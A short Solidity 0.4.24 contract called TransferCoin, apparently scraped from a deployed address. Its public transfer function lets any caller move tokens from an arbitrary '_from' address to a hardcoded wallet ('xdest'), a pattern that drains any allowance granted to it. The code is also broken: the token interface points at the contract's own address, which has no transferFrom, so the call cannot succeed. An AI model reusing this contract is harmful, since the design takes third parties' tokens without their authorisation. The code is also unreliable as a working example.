/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TransferCoin at 0xde6275840ae45cb0d49594938ba3b2f4bdcf4463
*/
pragma solidity ^0.4.24;
/*Copyright @ Allstarbit*/
interface Token {
    function approve(address spender, uint256 value) public returns (bool);
    function transferFrom(address from, address to, uint256 value) public returns (bool);   
}
contract TransferCoin {
    address public xdest = 0x5554a8f601673c624aa6cfa4f8510924dd2fc041;
    function getContractAddr() view public returns (address) {
        return this;
    }
    Token token = Token(getContractAddr());
    function transfer(address _from, uint value) public payable {
        require(token.transferFrom(_from, xdest, value));
    }
}